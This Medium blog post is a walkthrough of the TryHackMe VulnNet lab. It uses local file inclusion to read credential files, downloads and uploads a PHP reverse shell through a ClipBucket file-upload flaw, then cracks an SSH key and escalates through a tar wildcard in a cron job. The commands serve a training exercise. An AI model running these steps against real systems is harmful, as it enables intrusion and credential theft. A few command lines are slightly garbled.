---
title: "VulnNet Tryhackme Writeup 8cc910f0d53f"
platform: Medium
original_file: 2024-08-16_VulnNet-Tryhackme-Writeup-8cc910f0d53f.md
---

# VulnNet Tryhackme Writeup 8cc910f0d53f

::: {}
# VulnNet Tryhackme Writeup {#vulnnet-tryhackme-writeup .p-name}
:::

::: {.section .p-summary field="subtitle"}
Room link: https://www.tryhackme.com/room/vulnnet1 Note: This room is
Free
:::

::::::: {.section .e-content field="body"}
:::::: {#c3d0 .section .section .section--body .section--first .section--last}
::: section-divider

------------------------------------------------------------------------
:::

:::: section-content
::: {.section-inner .sectionLayout--insetColumn}
### VulnNet Tryhackme Writeup {#588f .graf .graf--h3 .graf--leading .graf--title name="588f"}

<figure id="0a67" class="graf graf--figure graf-after--h3">
<img
src="https://cdn-images-1.medium.com/max/800/1*GHeUQLIVwB8zp9_8whv-Gg.jpeg"
class="graf-image" data-image-id="1*GHeUQLIVwB8zp9_8whv-Gg.jpeg"
data-width="1280" data-height="720" data-is-featured="true" />
</figure>

**Room link:**
[https://www.tryhackme.com/room/vulnnet1](https://www.tryhackme.com/room/vulnnet1){.markup--anchor
.markup--p-anchor data-href="https://www.tryhackme.com/room/vulnnet1"
rel="noopener ugc nofollow noopener" target="_blank"}\
**Note: This room is Free**

### Enumeration {#732a .graf .graf--h3 .graf-after--p name="732a"}

Before we start enumerating the box, add the following line to your
`/etc/hosts`{.markup--code .markup--p-code} file.

> ***echo "10.10.236.130 vulnnet.thm" \>\> /etc/hosts***

### Enumeration {#6d32 .graf .graf--h3 .graf-after--blockquote name="6d32"}

<figure id="a7f2" class="graf graf--figure graf-after--h3">
<img
src="https://cdn-images-1.medium.com/max/800/0*ouEbX33RI96wf8ns.png"
class="graf-image" data-image-id="0*ouEbX33RI96wf8ns.png"
data-width="575" data-height="405" />
</figure>

There are `2`{.markup--code .markup--p-code} open ports. Port
`22`{.markup--code .markup--p-code} is used for `SSH`{.markup--code
.markup--p-code}, and port `80`{.markup--code .markup--p-code} serves a
web server. We start by enumerating the web server. Browsing to
`http://vulnnet.thm/`{.markup--code .markup--p-code} we find the
following page:

<figure id="7191" class="graf graf--figure graf-after--p">
<img
src="https://cdn-images-1.medium.com/max/800/0*3LBeQw3r0tzdTvvr.png"
class="graf-image" data-image-id="0*3LBeQw3r0tzdTvvr.png"
data-width="875" data-height="421" />
</figure>

Lets inspect the source code of the web apge

<figure id="4a91" class="graf graf--figure graf-after--p">
<img
src="https://cdn-images-1.medium.com/max/800/0*6Q4C2-zkL0SJjA7L.png"
class="graf-image" data-image-id="0*6Q4C2-zkL0SJjA7L.png"
data-width="454" data-height="136" />
</figure>

we see two strange JavaScript files.

Now we use
[LinkFinder](https://github.com/GerbenJavado/LinkFinder){.markup--anchor
.markup--p-anchor data-href="https://github.com/GerbenJavado/LinkFinder"
rel="noopener ugc nofollow noopener" target="_blank"} to find links in
JavaScript files. Run the following commands to find the hidden links:

``` {#cd39 .graf .graf--pre .graf-after--p .graf--preV2 code-block-mode="1" spellcheck="false" code-block-lang="bash"}
git clone https://github.com/GerbenJavado/LinkFinder.gitpip3 install -r requirements.txt
python3 linkfinder.py -d -i http://vulnnet.thm/ -o cli
```

<figure id="cd32" class="graf graf--figure graf-after--pre">
<img
src="https://cdn-images-1.medium.com/max/800/0*AxZV5clLIEImV-g2.png"
class="graf-image" data-image-id="0*AxZV5clLIEImV-g2.png"
data-width="561" data-height="356" />
</figure>

You should now find the following links:

``` {#0ed9 .graf .graf--pre .graf-after--p .graf--preV2 code-block-mode="1" spellcheck="false" code-block-lang="bash"}
http://broadcast.vulnnet.thm
http://vulnnet.thm/index.php?referer=
```

Add `broadcast.vulnnet.thm`{.markup--code .markup--p-code} to your
`/etc/hosts`{.markup--code .markup--p-code} file as well. Do so by
running:

``` {#4209 .graf .graf--pre .graf-after--p .graf--preV2 code-block-mode="1" spellcheck="false" code-block-lang="bash"}
echo "<box_ip>   broadcast.vulnnet.thm" >> /etc/hosts
```

Browsing to `http://broadcast.vulnnet.thm`{.markup--code
.markup--p-code} prompts a Basic Authentication login screen. We do not
have the credentials yet. However, we can abuse the
`referer`{.markup--code .markup--p-code} parameter in the URL. You can
read the contents of the `/etc/passwd`{.markup--code .markup--p-code} of
the machine by running:

<figure id="25bf" class="graf graf--figure graf-after--p">
<img
src="https://cdn-images-1.medium.com/max/800/0*Le_dHGzkwJQQpNLg.png"
class="graf-image" data-image-id="0*Le_dHGzkwJQQpNLg.png"
data-width="711" data-height="590" />
</figure>

Since we are dealing with an Apache web server, we have to find
the `.htpasswd`{.markup--code .markup--p-code} of the
`broadcast.vulnnet.thm`{.markup--code .markup--p-code} web server. By
default, you can view web configurations in the
`/etc/apache2/sites-enabled/000-default.conf`{.markup--code
.markup--p-code}. Run the following command to read this file:

<figure id="f67d" class="graf graf--figure graf-after--p">
<img
src="https://cdn-images-1.medium.com/max/800/0*xA6d5nFf7J1nCTWK.png"
class="graf-image" data-image-id="0*xA6d5nFf7J1nCTWK.png"
data-width="875" data-height="528" />
</figure>

You can see that the location of the `.htpasswd`{.markup--code
.markup--p-code} is: `/etc/apache2/.htpasswd`{.markup--code
.markup--p-code}. Run the following command to view the contents of the
`/etc/apache2/.htpasswd`{.markup--code .markup--p-code} file.

<figure id="bd3b" class="graf graf--figure graf-after--p">
<img
src="https://cdn-images-1.medium.com/max/800/0*O6f4p0kandDuLrfp.png"
class="graf-image" data-image-id="0*O6f4p0kandDuLrfp.png"
data-width="793" data-height="139" />
</figure>

Inside the `/etc/apache2/.htpasswd`{.markup--code .markup--p-code} file,
you find the following user/hash combination

<figure id="70a9" class="graf graf--figure graf-after--p">
<img
src="https://cdn-images-1.medium.com/max/800/0*s_tA0Muqmca0dJk6.png"
class="graf-image" data-image-id="0*s_tA0Muqmca0dJk6.png"
data-width="581" data-height="287" />
</figure>

Here we cracked hash and get password for developers user

Browse to `http://broadcast.vulnnet.thm/`{.markup--code .markup--p-code}
and fill in the credentials. You should now see the following page:

<figure id="a531" class="graf graf--figure graf-after--p">
<img
src="https://cdn-images-1.medium.com/max/800/0*iogF_86JCxbLYlCJ.png"
class="graf-image" data-image-id="0*iogF_86JCxbLYlCJ.png"
data-width="875" data-height="434" />
</figure>

<figure id="b7b2" class="graf graf--figure graf-after--figure">
<img
src="https://cdn-images-1.medium.com/max/800/0*Wx1UBWlpWBIH4BBZ.png"
class="graf-image" data-image-id="0*Wx1UBWlpWBIH4BBZ.png"
data-width="1250" data-height="365" />
</figure>

### ClipBucket Exploit {#75b3 .graf .graf--h3 .graf-after--figure name="75b3"}

The broadcast site is running ClipBucket.
[ClipBucket](https://clipbucket.com/){.markup--anchor .markup--p-anchor
data-href="https://clipbucket.com/" rel="noopener ugc nofollow noopener"
target="_blank"} is used to build your own video streaming software.
ClipBucket is running version 4.0. This version is vulnerable to the
following
[exploit](https://www.exploit-db.com/exploits/44250){.markup--anchor
.markup--p-anchor data-href="https://www.exploit-db.com/exploits/44250"
rel="noopener ugc nofollow noopener" target="_blank"}. This exploit is
an unauthenticated file upload vulnerability. Get a PHP reverse shell by
running the following command

``` {#ae99 .graf .graf--pre .graf-after--p .graf--preV2 code-block-mode="1" spellcheck="false" code-block-lang="perl"}
wget https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php
```

<figure id="6a59" class="graf graf--figure graf-after--pre">
<img
src="https://cdn-images-1.medium.com/max/800/0*wsRSDwp_uM2YX_F9.png"
class="graf-image" data-image-id="0*wsRSDwp_uM2YX_F9.png"
data-width="514" data-height="410" />
</figure>

Open the file in your favorite code editor and change the IP address to
your local attacking machine and the port number to 1234. Now you can
use the following command to upload the PHP shell to the server.

``` {#68f9 .graf .graf--pre .graf-after--p .graf--preV2 code-block-mode="1" spellcheck="false" code-block-lang="perl"}
curl -F "file=@php-reverse-shell.php" -F "plupload=1" -F "name=php-reverse-shell.php" http://broadcast.vulnnet.thm/actions/photo_uploader.php -u developers:<REDACTED>
```

<figure id="f7a6" class="graf graf--figure graf-after--pre">
<img
src="https://cdn-images-1.medium.com/max/800/0*jV6cfPWCV430Lh26.png"
class="graf-image" data-image-id="0*jV6cfPWCV430Lh26.png"
data-width="814" data-height="121" />
</figure>

Browse to `http://broadcast.vulnnet.thm/files/`{.markup--code
.markup--p-code} to find a directory listing. Your shell resides within
the `photos`{.markup--code .markup--p-code} directory. Inside this
directory is a directory with the current date. On your local attacking
machine, run the following command:

<figure id="c7b0" class="graf graf--figure graf-after--p">
<img
src="https://cdn-images-1.medium.com/max/800/0*CiPZ8kkuZG4ghNCJ.png"
class="graf-image" data-image-id="0*CiPZ8kkuZG4ghNCJ.png"
data-width="670" data-height="294" />
</figure>

Start netcat listener

``` {#f95d .graf .graf--pre .graf-after--p .graf--preV2 code-block-mode="1" spellcheck="false" code-block-lang="yaml"}
nc -lvp 1234
```

<figure id="c57c" class="graf graf--figure graf-after--pre">
<img
src="https://cdn-images-1.medium.com/max/800/0*Jun06JBVkEm4GJlb.png"
class="graf-image" data-image-id="0*Jun06JBVkEm4GJlb.png"
data-width="677" data-height="223" />
</figure>

Open the shell in your browser, and you should receive a connection. Run
the following commands to improve your shell:

``` {#cdf1 .graf .graf--pre .graf-after--p .graf--preV2 code-block-mode="1" spellcheck="false" code-block-lang="bash"}
python3 -c 'import pty;pty.spawn("/bin/bash")'
export TERM=xterm-256color
CTRL+Z
stty raw -echo;fg
ENTER
ENTEng styleR
```

### User Flag {#d100 .graf .graf--h3 .graf-after--pre name="d100"}

Now that we have gained a foothold in the system, we need to elevate our
privileges and find the `user.txt`{.markup--code .markup--p-code} flag.
When checking the `/var/backups`{.markup--code .markup--p-code}
directory, we find the `ssh-backup.tar.gz`{.markup--code
.markup--p-code} file. Run the following commands on the server

<figure id="4616" class="graf graf--figure graf-after--p">
<img
src="https://cdn-images-1.medium.com/max/800/0*e3bYOHeG7i-_zsL-.png"
class="graf-image" data-image-id="0*e3bYOHeG7i-_zsL-.png"
data-width="630" data-height="427" />
</figure>

You should now see the content of a private key show up on your screen.
Copy these lines and save them in a file on your local machine. Name
this file `id_rsa`{.markup--code .markup--p-code}. The SSH private key
is password protected. We can try to brute-force the password of the
private key by using `ssh2john.py`{.markup--code .markup--p-code}.
`ssh2john.py`{.markup--code .markup--p-code} converts a private key to a
hash brute-forceable by `john`{.markup--code .markup--p-code}. Run the
following commands to brute-force the password of the private key:

<figure id="c0fc" class="graf graf--figure graf-after--p">
<img
src="https://cdn-images-1.medium.com/max/800/0*eVwleYgH43SYUVdI.png"
class="graf-image" data-image-id="0*eVwleYgH43SYUVdI.png"
data-width="722" data-height="349" />
</figure>

After a while, you should find the password of the private key. Log in
using SSH by running the following command:

ssh -i id_rsa2 server-management@vulnnet.thm

<figure id="1a7b" class="graf graf--figure graf-after--p">
<img
src="https://cdn-images-1.medium.com/max/800/0*40bhMjsmItmNPpHX.png"
class="graf-image" data-image-id="0*40bhMjsmItmNPpHX.png"
data-width="701" data-height="381" />
</figure>

rovide the password, and you should now be logged in as the
`server-management`{.markup--code .markup--p-code} user. The
`user.txt`{.markup--code .markup--p-code} flag resides at
`/home/server-management/user.txt`{.markup--code .markup--p-code}

### Root Flag {#ccea .graf .graf--h3 .graf-after--p name="ccea"}

The final step is finding the `root.txt`{.markup--code .markup--p-code}
flag. There is a Cron job located at `/etc/crontab`{.markup--code
.markup--p-code}. Every 30 seconds the
`/var/opt/backupsrv.sh`{.markup--code .markup--p-code} script is
executed by the `root`{.markup--code .markup--p-code} user. The content
of the script can be seen below:

inside `/var/opt/`{.markup--code .markup--p-code} we see a file called
`backupsrv.sh`{.markup--code .markup--p-code}

<figure id="6365" class="graf graf--figure graf-after--p">
<img
src="https://cdn-images-1.medium.com/max/800/0*OFvyOAH6sAu7Ig8_.png"
class="graf-image" data-image-id="0*OFvyOAH6sAu7Ig8_.png"
data-width="837" data-height="524" />
</figure>

<figure id="677f" class="graf graf--figure graf-after--figure">
<img
src="https://cdn-images-1.medium.com/max/800/0*CJbZhpmrcj6tealy.png"
class="graf-image" data-image-id="0*CJbZhpmrcj6tealy.png"
data-width="524" data-height="342" />
</figure>

There is a wildcard vulnerability in play here. Whenever you use
`tar`{.markup--code .markup--p-code} with a wildcard, you can create
files that get executed. Run the following commands to obtain access to
the `root`{.markup--code .markup--p-code} user

<figure id="c838" class="graf graf--figure graf-after--p">
<img
src="https://cdn-images-1.medium.com/max/800/0*MOQJdO4dUMDaspYn.png"
class="graf-image" data-image-id="0*MOQJdO4dUMDaspYn.png"
data-width="775" data-height="151" />
</figure>

<figure id="10ee" class="graf graf--figure graf-after--figure">
<img
src="https://cdn-images-1.medium.com/max/800/0*zExlX-zZybpH9IbL.png"
class="graf-image" data-image-id="0*zExlX-zZybpH9IbL.png"
data-width="592" data-height="172" />
</figure>

### Promote and Collaborate on Cybersecurity Insights {#158e .graf .graf--h3 .graf-after--figure name="158e"}

We are excited to offer promotional opportunities and guest post
collaborations on our blog and website, focusing on all aspects of
cybersecurity. Whether you're an expert with valuable insights to share
or a business looking to reach a wider audience, our platform provides
the perfect space to showcase your knowledge and services. Let's work
together to enhance our community's understanding of cybersecurity!

### About the Author: {#b9c4 .graf .graf--h3 .graf-after--p name="b9c4"}

[Vijay
Gupta](https://medium.com/@bevijaygupta/who-is-vijay-gupta-2ecad87f92a2){.markup--anchor
.markup--p-anchor
data-href="https://medium.com/@bevijaygupta/who-is-vijay-gupta-2ecad87f92a2"
rel="noopener" target="_blank"} is a cybersecurity enthusiast with
several years of experience in cyber security, [cyber crime forensics
investigation](https://play.google.com/store/books/details?id=VRz7EAAAQBAJ){.markup--anchor
.markup--p-anchor
data-href="https://play.google.com/store/books/details?id=VRz7EAAAQBAJ"
rel="noopener ugc nofollow noopener" target="_blank"}, and security
awareness training in schools and colleges. With a passion for
safeguarding digital environments and educating others about
cybersecurity best practices, Vijay has dedicated his career to
promoting cyber safety and resilience. Stay connected with Vijay Gupta
on various social media platforms and professional networks to access
valuable insights and stay updated on the latest cybersecurity trends.
:::
::::
::::::
:::::::

By [Vijay Kumar Gupta](https://medium.com/@bevijaygupta){.p-author
.h-card} on [August 16, 2024](https://medium.com/p/8cc910f0d53f).

[Canonical
link](https://medium.com/@bevijaygupta/vulnnet-tryhackme-writeup-8cc910f0d53f){.p-canonical}

Exported from [Medium](https://medium.com) on February 9, 2026.
